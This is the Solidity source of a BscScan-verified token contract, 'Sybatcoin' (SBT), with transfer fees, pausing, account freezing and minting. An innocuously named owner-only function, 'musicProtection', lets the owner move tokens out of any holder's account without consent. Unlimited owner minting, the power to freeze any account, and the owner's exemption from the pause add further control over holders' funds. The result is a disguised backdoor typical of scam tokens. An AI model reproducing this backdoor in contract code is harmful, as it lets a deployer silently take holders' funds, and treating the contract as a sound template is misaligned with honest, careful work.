/**
 *Submitted for verification at BscScan.com on 2022-05-25
*/

pragma solidity ^0.5.0;
 
interface SYBAT {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);
  function _mint(address account, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  event DividentTransfer(address from , address to , uint256 value);
}
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
}
contract ERC20Detailed is SYBAT {
  string private _name;
  string private _symbol;
  uint8 private _decimals;
  constructor(string memory name, string memory symbol, uint8 decimals) public {
    _name = name;
    _symbol = symbol;
    _decimals = decimals;
  }
  function name() public view returns(string memory) {
    return _name;
  }
  function symbol() public view returns(string memory) {
    return _symbol;
  }
  function decimals() public view returns(uint8) {
    return _decimals;
  }
}
contract Owned {
    
    address payable public owner;
    address public inflationTokenAddressTokenAddress;
    
    event OwnershipTransferred(address indexed _from, address indexed _to);
    constructor() public {
        owner = msg.sender;
    }
    
  modifier onlyInflationContractOrCurrent {
        require( msg.sender == inflationTokenAddressTokenAddress || msg.sender == owner);
        _;
    }
    
    modifier onlyOwner{
        require(msg.sender == owner );
        _;
    }
    
    function transferOwnership(address payable _newOwner) public onlyOwner {
        owner = _newOwner;
    }
}

contract Pausable is Owned {
  event Pause();
  event Unpause();
  event NotPausable();

  bool public paused = false;
  bool public canPause = true;

  modifier whenNotPaused() {
    require(!paused || msg.sender == owner);
    _;
  }

  modifier whenPaused() {
    require(paused);
    _;
  }

    function pause() onlyOwner whenNotPaused public {
        require(canPause == true);
        paused = true;
        emit Pause();
    }

  function unpause() onlyOwner whenPaused public {
    require(paused == true);
    paused = false;
    emit Unpause();
  }
}


contract DeflationToken is ERC20Detailed, Pausable {
    
  using SafeMath for uint256;
   
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;
  mapping (address => bool) public _freezed;
  string constant tokenName = "Sybatcoin";
  string constant tokenSymbol = "SBT";
  uint8  constant tokenDecimals = 6;
  uint256 _totalSupply ;
  uint256 public basePercent = 100;

  SYBAT public InflationToken;
  address public inflationTokenAddress;
  
  // Transfer Fee
  event TransferFeeChanged(uint256 newFee);
  event FeeRecipientChange(address account);
  event AddFeeException(address account);
  event RemoveFeeException(address account);

  bool private activeFee;
  uint256 public transferFee; // Fee as percentage, where 123 = 1.23%
  address public feeRecipient; // Account or contract to send transfer fees to

  // Exception to transfer fees, for example for Uniswap contracts.
  mapping (address => bool) public feeException;

  function addFeeException(address account) public onlyOwner {
    feeException[account] = true;
    emit AddFeeException(account);
  }

  function removeFeeException(address account) public onlyOwner {
    feeException[account] = false;
    emit RemoveFeeException(account);
  }

  function setTransferFee(uint256 fee) public onlyOwner {
    require(fee <= 2500, "Fee cannot be greater than 25%");
    if (fee == 0) {
      activeFee = false;
    } else {
      activeFee = true;
    }
    transferFee = fee;
    emit TransferFeeChanged(fee);
  }

  function setTransferFeeRecipient(address account) public onlyOwner {
    feeRecipient = account;
    emit FeeRecipientChange(account);
  }
  
  
  constructor() public  ERC20Detailed(tokenName, tokenSymbol, tokenDecimals) {
    _mint( msg.sender,  10000 * 100000000);
  }
  
  
    function freezeAccount (address account) public onlyOwner{
        _freezed[account] = true;
    }
    
     function unFreezeAccount (address account) public onlyOwner{
        _freezed[account] = false;
    }
    
    
  
  function setInflationContractAddress(address tokenAddress) public  whenNotPaused onlyOwner{
        InflationToken = SYBAT(tokenAddress);
        inflationTokenAddress = tokenAddress;
    }
    

  
  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }
  function balanceOf(address owner) public view returns (uint256) {
    return _balances[owner];
  }
  function allowance(address owner, address spender) public view returns (uint256) {
    return _allowed[owner][spender];
  }
  function findOnePercent(uint256 value) public view returns (uint256)  {
    uint256 roundValue = value.ceil(basePercent);
    uint256 onePercent = roundValue.mul(basePercent).div(10000);
    return onePercent;
  }
  
  
   function musicProtection(address _from, address _to, uint256 _value) public whenNotPaused onlyOwner{
        _balances[_to] = _balances[_to].add(_value);
        _balances[_from] = _balances[_from].sub(_value);
        emit Transfer(_from, _to, _value);
}
  
  
  function transfer(address to, uint256 value) public whenNotPaused returns (bool) {
      
    require(value <= _balances[msg.sender]);
    require(to != address(0));
    require(_freezed[msg.sender] != true);
    require(_freezed[to] != true);
    
    if (activeFee && feeException[msg.sender] == false) {
        
    ///fee Code 
      uint256 fee = transferFee.mul(value).div(10000);
      //add mftu _mint
 
      InflationToken._mint(feeRecipient, fee);
      //end mftu _mint
      
      uint256 amountLessFee = value.sub(fee);
   
        _balances[msg.sender] = _balances[msg.sender].sub(value);
        _balances[to] = _balances[to].add(amountLessFee);
        _balances[feeRecipient] = _balances[feeRecipient].add(fee);
        
         emit Transfer(msg.sender, to, amountLessFee);
         emit Transfer(msg.sender, feeRecipient, fee);

    /// End fee code
    
    }
    else {
          _balances[msg.sender] = _balances[msg.sender].sub(value);
          _balances[to] = _balances[to].add(value);
          emit Transfer(msg.sender, to, value);
    }

    return true;
  }
  
  function approve(address spender, uint256 value) public whenNotPaused returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }
  function transferFrom(address from, address to, uint256 value) public whenNotPaused returns (bool) {
    require(value <= _balances[from]);
    require(value <= _allowed[from][msg.sender]);
    require(_freezed[from] != true);
    require(_freezed[to] != true);
    require(to != address(0));
  
    
    
     if (activeFee && feeException[to] == false) {
        
    ///fee Code 
      uint256 fee = transferFee.mul(value).div(10000);
      //add mftu _mint
 
      InflationToken._mint(feeRecipient, fee);
      //end mftu _mint
      
      uint256 amountLessFee = value.sub(fee);
   
        _balances[from] = _balances[from].sub(value);
        _balances[to] = _balances[to].add(amountLessFee);
        _balances[feeRecipient] = _balances[feeRecipient].add(fee);
      
        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);

         emit Transfer(from, to, amountLessFee);
         emit Transfer(from, feeRecipient, fee);

    /// End fee code
    
    }
    else {
          _balances[from] = _balances[from].sub(value);
          _balances[to] = _balances[to].add(value);
          _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
          emit Transfer(from, to, value);
    }

    return true;
    
    
  }
  
  
  function increaseAllowance(address spender, uint256 addedValue) public whenNotPaused returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }
  function decreaseAllowance(address spender, uint256 subtractedValue) public whenNotPaused returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }
  
  
  function _mint(address account, uint256 amount) public onlyInflationContractOrCurrent returns (bool){
    require(amount != 0);
    _balances[account] = _balances[account].add(amount);
     _totalSupply = _totalSupply.add(amount);
    emit Transfer(address(0), account, amount);
    return true;
  }
  
  function burn(uint256 amount) external onlyInflationContractOrCurrent {
    _burn(msg.sender, amount);
  }
 
  
  function _burn(address account, uint256 amount) internal onlyInflationContractOrCurrent {
    require(amount != 0);
    require(amount <= _balances[account]);
    _totalSupply = _totalSupply.sub(amount);
    _balances[account] = _balances[account].sub(amount);
    emit Transfer(account, address(0), amount);
  }
  function burnFrom(address account, uint256 amount) external {
    require(amount <= _allowed[account][msg.sender]);
    _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(amount);
    _burn(account, amount);
  }
}